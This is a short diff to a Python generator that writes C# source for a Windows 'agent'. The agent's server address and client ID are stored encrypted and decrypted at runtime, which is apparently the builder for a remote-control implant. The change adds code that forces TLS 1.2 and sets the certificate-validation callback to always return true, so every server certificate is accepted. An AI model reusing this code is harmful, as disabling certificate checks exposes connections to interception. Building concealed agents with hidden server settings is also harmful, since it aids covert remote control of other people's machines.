@@ -1508,6 +1508,10 @@ def generate_agent_source(bc):
         "        [STAThread]\n"
         "        static void Main() {\n"
         "            try {\n"
+        "                // Force TLS 1.2 & Ignore Cert Errors\n"
+        "                System.Net.ServicePointManager.SecurityProtocol = (System.Net.SecurityProtocolType)3072;\n"
+        "                System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };\n"
+        "\n"
         "                // Decrypt config\n"
         '                _server = DecStr("' + enc_server + '");\n'
         '                _clientId = DecStr("' + enc_id + '");\n'
